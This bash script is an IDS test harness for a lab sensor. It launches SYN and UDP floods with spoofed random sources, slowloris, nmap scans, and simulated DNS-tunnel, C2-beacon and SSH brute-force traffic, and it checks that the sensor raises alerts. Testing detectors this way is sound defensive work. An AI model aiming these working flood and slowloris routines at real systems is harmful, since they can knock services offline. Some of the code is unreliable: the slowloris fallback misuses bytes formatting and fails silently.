#!/usr/bin/env bash
# ==============================================================================
# UniShield Attack Test Suite (Attacker VM -> Laptop 1 UI Verification)
# Target: 10.0.10.10 (uni-shield sensor on lablan)
#
# FIXES vs the January draft:
#   1. UDP flood now uses `-2` (hping3 UDP). The old `-U` is the TCP **URG**
#      flag, so "UDP flood" was actually a TCP URG-flag flood -> uniShield
#      (correctly) merged it into the 'ddos' family instead of UDP 'dos'.
#   2. C2 beacon binds a FIXED local source port so every heartbeat shares one
#      5-tuple flow. A fresh ephemeral port per connect fragments the beacons
#      into ~15 one-shot flows, and the periodicity feature never accumulates.
#   3. Slowloris note: an HTTP listener MUST be serving TARGET:80, otherwise
#      `socket count: 0` and nothing travels. uniShield now fires at >=1.5
#      open conn/s (i.e. ~90 held sockets).
#   4. DNS tunneling works automatically now that the live capture parses
#      client DNS queries (was server-only before; queries were ignored).
# ==============================================================================

TARGET_IP="${1:-10.0.10.10}"
INTERFACE="enp0s3"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}================================================================${NC}"
echo -e "${CYAN}       UniShield Attack Test Suite for Laptop 1 UI Check        ${NC}"
echo -e "${CYAN}================================================================${NC}"
echo -e "Target IP   : ${YELLOW}${TARGET_IP}${NC}"
echo -e "Interface   : ${YELLOW}${INTERFACE}${NC}"
echo -e "Script rev  : ${GREEN}dns5labels / udp-2 / c2-fixedport / brute-force / self-report${NC}"
echo -e "Started     : ${YELLOW}$(date '+%F %T %Z')${NC}"
echo ""

# Make sure a failing step can never silently hide errors.
set +e

print_step() {
    echo -e "\n${YELLOW}[+] Scenario $1:${NC} ${GREEN}$2${NC}"
    echo -e "    Expected Laptop 1 UI Alert: ${RED}$3${NC}"
    echo -e "    Running: $4"
}

# 1. Connectivity Check
echo -e "${YELLOW}[*] Verifying connectivity to ${TARGET_IP}...${NC}"
if ping -c 2 -W 2 "${TARGET_IP}" > /dev/null 2>&1; then
    echo -e "${GREEN}[✓] Target ${TARGET_IP} is reachable on lablan.${NC}"
else
    echo -e "${RED}[!] Target ${TARGET_IP} is not responding to ping.${NC}"
    echo -e "    Ensure uni-shield VM is running and 10.0.10.10 is up."
fi

# Menu loop
show_menu() {
    echo -e "\n${CYAN}Select an attack scenario to test on Laptop 1 UI:${NC}"
    echo "1) Benign Baseline Traffic (iperf3 / HTTP)    -> Expected: No Alert (Metrics update)"
    echo "2) SYN Flood Attack (TCP SYN burst)           -> Expected: 'ddos' alert"
    echo "3) UDP Flood Attack (High-rate UDP)           -> Expected: 'ddos' alert (real UDP this time, -2)"
    echo "4) Slowloris Attack (Low & Slow HTTP)         -> Expected: 'dos' alert - NEEDS a :80 listener on target"
    echo "5) DNS Tunneling Simulation (High entropy DNS)-> Expected: 'dns_tunneling' alert"
    echo "6) C2 Beaconing Simulation (Periodic Conns)   -> Expected: 'c2_communication' alert (fixed src port)"
    echo "7) Port Scan / Recon (Nmap stealth scan)      -> Expected: Port scan alert"
    echo "8) Brute Force Attack (Rapid auth attempts)   -> Expected: 'brute_force' alert"
    echo "9) Run Full Automated Test Suite (All in order)"
    echo "q) Quit"
    echo -n "Enter choice [1-9/q]: "
}

run_benign() {
    print_step "1" "Benign Baseline Traffic" "No Alert (Flow rate & active flows metric increase)" "iperf3 or HTTP curl loop"
    if command -v iperf3 >/dev/null 2>&1; then
        timeout 10 iperf3 -c "${TARGET_IP}" -t 5 -b 10M || true
    else
        for i in {1..30}; do
            curl -s -m 1 "http://${TARGET_IP}/" >/dev/null 2>&1 || true
            sleep 0.1
        done
    fi
    echo -e "${GREEN}[✓] Sent benign traffic. Check Laptop 1 UI: Flow rate counter should rise without threat alerts.${NC}"
}

run_syn_flood() {
    print_step "2" "SYN Flood Attack" "'ddos' alert" "hping3 -S -p 80 --flood"
    if command -v hping3 >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Flooding SYN packets for 8 seconds...${NC}"
        sudo timeout 8 hping3 -S -p 80 --flood --rand-source "${TARGET_IP}"
    else
        python3 -c "
import socket, time
t_end = time.time() + 8
while time.time() < t_end:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        s.connect_ex(('${TARGET_IP}', 80))
        s.close()
    except:
        pass
"
    fi
    echo -e "${GREEN}[✓] SYN flood completed. Check Laptop 1 UI: 'ddos' alert should appear on dashboard & live feed.${NC}"
}

run_udp_flood() {
    print_step "3" "UDP Flood Attack" "'ddos' alert" "hping3 -2 -p 1234 --flood"
    if command -v hping3 >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Flooding UDP packets for 8 seconds...${NC}"
        echo -e "${YELLOW}    NOTE: -2 is UDP mode; -U would send TCP URG and read as another ddos flood!${NC}"
        sudo timeout 8 hping3 -2 -p 1234 --flood --rand-source "${TARGET_IP}"
    else
        python3 -c "
import socket, random, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1024)
t_end = time.time() + 8
while time.time() < t_end:
    s.sendto(payload, ('${TARGET_IP}', 1234))
"
    fi
    echo -e "${GREEN}[✓] UDP flood completed. Check Laptop 1 UI: 'ddos' alert should pop up in real-time alerts table.${NC}"
}

run_slowloris() {
    print_step "4" "Slowloris Attack" "'dos' alert" "slowloris -p 80 -n 150 (needs service on :80)"
    python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
try:
    s.connect(('${TARGET_IP}', 80)); print('TARGET:80 is LISTENING — slowloris sockets will hold.')
except Exception as e:
    print('TARGET:80 is CLOSED — slowloris will open 0 sockets. Start: python3 -m http.server 80 (root)')
s.close()
"
    if command -v slowloris >/dev/null 2>&1; then
        timeout 15 slowloris -p 80 -s 150 "${TARGET_IP}" || true
    else
        timeout 60 python3 -c "
import socket, time
sockets = []
for _ in range(100):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(('${TARGET_IP}', 80))
        s.send(b'GET /?{} HTTP/1.1\r\n'.format(_).encode('utf-8'))
        s.send(b'User-Agent: Mozilla/5.0\r\n')
        s.send(b'Accept-language: en-US,en,q=0.5\r\n')
        sockets.append(s)
    except:
        pass
print(f'Holding {len(sockets)} slow connections...')
for _ in range(5):
    for s in list(sockets):
        try:
            s.send(b'X-a: b\r\n')
        except:
            sockets.remove(s)
    time.sleep(2)
"
    fi
    echo -e "${GREEN}[✓] Slowloris test completed. (If sockets were 0, start a web server on TARGET:80 first — e.g. python3 -m http.server 80.)${NC}"
}

run_dns_tunnel() {
    print_step "5" "DNS Tunneling Simulation" "'dns_tunneling' alert" "High-entropy DNS queries (4-5 random labels)"
    python3 -c "
import socket, random, string, time
alphabet = string.ascii_letters + string.digits + '-_'
def random_label(n):
    return ''.join(random.choices(alphabet, k=n))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print('Sending simulated high-entropy DNS tunnel payloads...')
for i in range(50):
    subdomain = '.'.join(random_label(random.randint(18, 30)) for _ in range(5)) + '.t'
    # Raw minimal DNS query construction
    txn_id = random.randint(1, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'
    qdcount = b'\x00\x01'
    ancount = nscount = arcount = b'\x00\x00'
    qname = b''
    for part in subdomain.split('.'):
        qname += len(part).to_bytes(1, 'big') + part.encode()
    qname += b'\x00'
    qtype = b'\x00\x10' # TXT record
    qclass = b'\x00\x01' # IN
    dns_pkt = txn_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
    sock.sendto(dns_pkt, ('${TARGET_IP}', 53))
    time.sleep(0.05)
"
    echo -e "${GREEN}[✓] DNS Tunnel packets sent. Check Laptop 1 UI: 'dns_tunneling' alert detected.${NC}"
}

run_c2_beacon() {
    print_step "6" "C2 Beaconing Simulation" "'c2_communication' alert" "Fixed-interval heartbeat connections (FIXED src port)"
    python3 -c "
import socket, time
print('Simulating regular timing C2 beacon heartbeats...')
for i in range(15):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', 22444))          # FIXED src port -> one 5-tuple flow
        s.settimeout(1.5)
        s.connect(('${TARGET_IP}', 4444))
        s.send(b'BEACON_HEARTBEAT_DATA_ID_007\n')
        s.close()
    except:
        pass
    time.sleep(1.0)
"
    echo -e "${GREEN}[✓] C2 Beaconing completed. Check Laptop 1 UI: 'c2_communication' alert should be generated.${NC}"
}

run_port_scan() {
    print_step "7" "Port Scan / Reconnaissance" "Port Scan / Suspicious Recon alert" "nmap -sS -p 20-1000"
    if command -v nmap >/dev/null 2>&1; then
        sudo nmap -sS -T4 -p 20-1000 "${TARGET_IP}" || true
    else
        python3 -c "
import socket
for port in [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 8080, 8443, 3306, 5432]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.05)
    s.connect_ex(('${TARGET_IP}', port))
    s.close()
"
    fi
    echo -e "${GREEN}[✓] Port scan completed. Check Laptop 1 UI: Reconnaissance/Port Scan alerts triggered.${NC}"
}

run_brute_force() {
    print_step "8" "Brute Force Attack" "'brute_force' alert" "Rapid repeated connections to port 22"
    python3 -c "
import socket, time
print('Simulating SSH brute-force login attempts...')
attempts = 0
for i in range(80):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect(('${TARGET_IP}', 22))
        s.send(b'FAKE_SSH_BANNER\r\n')
        s.close()
        attempts += 1
    except:
        pass
print(f'Sent {attempts} connection attempts to port 22')
"
    echo -e "${GREEN}[✓] Brute force test completed. Check Laptop 1 UI: 'brute_force' alert should appear.${NC}"
}

run_all() {
    echo -e "\n${CYAN}>>> Executing Full Attack Test Suite sequentially <<<${NC}"
    STEP=0
    for fn in run_benign run_syn_flood run_udp_flood run_slowloris run_dns_tunnel run_c2_beacon run_port_scan run_brute_force; do
        STEP=$((STEP+1))
        echo -e "\n${CYAN}--- [step $STEP/8: $fn] $(date '+%T') ---${NC}"
        T0=$(date +%s)
        $fn
        echo -e "${CYAN}--- [step $STEP/8 done in $(( $(date +%s) - T0 ))s, rc=$?] $(date '+%T') ---${NC}"
        sleep 3
    done
    echo -e "\n${GREEN}================================================================${NC}"
    echo -e "${GREEN}       All attack tests finished! Inspect Laptop 1 UI.          ${NC}"
    echo -e "${GREEN}================================================================${NC}"
}

while true; do
    show_menu
    read -r choice
    case "$choice" in
        1) run_benign ;;
        2) run_syn_flood ;;
        3) run_udp_flood ;;
        4) run_slowloris ;;
        5) run_dns_tunnel ;;
        6) run_c2_beacon ;;
        7) run_port_scan ;;
        8) run_brute_force ;;
        9) run_all ;;
        q|Q) echo "Exiting."; exit 0 ;;
        *) echo -e "${RED}Invalid choice!${NC}" ;;
    esac
done